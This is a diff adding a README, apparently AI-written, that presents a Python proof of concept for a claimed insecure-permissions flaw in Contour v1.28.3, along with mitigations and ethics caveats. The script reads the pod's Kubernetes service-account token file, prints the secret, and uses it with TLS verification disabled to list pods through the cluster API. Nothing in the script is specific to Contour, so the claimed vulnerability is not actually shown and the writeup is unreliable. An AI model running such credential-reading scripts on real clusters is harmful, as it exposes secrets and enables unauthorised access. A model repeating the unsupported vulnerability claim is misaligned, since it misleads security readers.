@@ -1,0 +1,118 @@
+Here’s a `README.md` for a Proof of Concept (PoC) demonstrating the insecure permissions vulnerability in Contour v1.28.3:
+
+---
+
+# Proof of Concept (PoC) for Insecure Permissions Vulnerability in Contour v1.28.3
+
+This repository contains a Proof of Concept (PoC) script demonstrating an insecure permissions vulnerability in Contour v1.28.3. This vulnerability allows attackers to access sensitive data and escalate privileges by obtaining the service account's token.
+
+## Vulnerability Description
+
+**CVE-ID**: (Pending)
+
+**Overview**:
+Contour v1.28.3 contains insecure permissions that allow attackers to access the service account's token. By exploiting this vulnerability, an attacker can obtain the service account's token, which can be used to access sensitive data and potentially escalate privileges within the Kubernetes cluster.
+
+**Affected Versions**:
+- Contour v1.28.3
+
+**Mitigations**:
+- Review and adjust permissions of service accounts used by Contour.
+- Ensure that service accounts have the minimum required permissions.
+- Regularly audit and rotate service account tokens.
+
+## PoC Details
+
+This PoC script demonstrates how to access the service account's token in Contour v1.28.3. Ensure you have explicit permission to perform this test.
+
+### PoC Script
+
+```python
+import os
+import requests
+
+# Configuration
+kubernetes_api_url = "https://kubernetes.default.svc"  # Kubernetes API URL
+token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"  # Path to the service account token
+namespace_path = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"  # Path to the namespace
+
+def get_service_account_token():
+    try:
+        # Read the service account token
+        with open(token_path, 'r') as token_file:
+            token = token_file.read().strip()
+        print(f"[+] Service Account Token: {token}")
+        return token
+    except Exception as e:
+        print(f"[-] Error reading token: {e}")
+        return None
+
+def get_namespace():
+    try:
+        # Read the namespace
+        with open(namespace_path, 'r') as namespace_file:
+            namespace = namespace_file.read().strip()
+        print(f"[+] Namespace: {namespace}")
+        return namespace
+    except Exception as e:
+        print(f"[-] Error reading namespace: {e}")
+        return None
+
+def access_kubernetes_api(token, namespace):
+    try:
+        # Set the headers with the token
+        headers = {
+            "Authorization": f"Bearer {token}",
+            "Content-Type": "application/json"
+        }
+        
+        # Make a request to the Kubernetes API to get pods in the namespace
+        response = requests.get(f"{kubernetes_api_url}/api/v1/namespaces/{namespace}/pods", headers=headers, verify=False)
+        
+        # Print the response details
+        print("Status Code:", response.status_code)
+        print("Response Body:", response.json())
+        
+        if response.status_code == 200:
+            print("[+] Successfully accessed Kubernetes API.")
+        else:
+            print("[-] Failed to access Kubernetes API.")
+    except Exception as e:
+        print(f"[-] An error occurred: {e}")
+
+if __name__ == "__main__":
+    # Get the service account token and namespace
+    token = get_service_account_token()
+    namespace = get_namespace()
+    
+    if token and namespace:
+        # Access the Kubernetes API using the token
+        access_kubernetes_api(token, namespace)
+```
+
+### Explanation
+
+1. **Configuration**: The script configures the Kubernetes API URL and the paths to the service account token and namespace files.
+2. **Get Service Account Token**: Reads the service account token from the file system.
+3. **Get Namespace**: Reads the namespace from the file system.
+4. **Access Kubernetes API**: Uses the token to make a request to the Kubernetes API to list the pods in the namespace.
+
+## Important Considerations
+
+- **Permissions**: Ensure you have explicit permission to test this vulnerability on the target system. Unauthorized testing is illegal and unethical.
+- **Testing Environment**: Conduct tests in a controlled environment to avoid impacting production systems.
+- **Ethical Use**: Use this PoC responsibly and only in authorized contexts.
+
+## Mitigation
+
+To address this vulnerability:
+
+1. **Review Service Account Permissions**: Ensure that service accounts have the minimum required permissions.
+2. **Audit and Rotate Tokens**: Regularly audit service accounts and rotate tokens to minimize the risk of token compromise.
+3. **Update Contour**: Keep Contour and other Kubernetes components up to date with the latest security patches.
+
+For more information on securing your Contour deployment, refer to the official [Contour documentation](https://projectcontour.io/docs/).
+
+---
+
+This `README.md` provides an overview of the vulnerability, a PoC script to demonstrate the issue, and instructions on how to mitigate the risk. Ensure you handle this PoC responsibly and only on systems where you have explicit authorization.
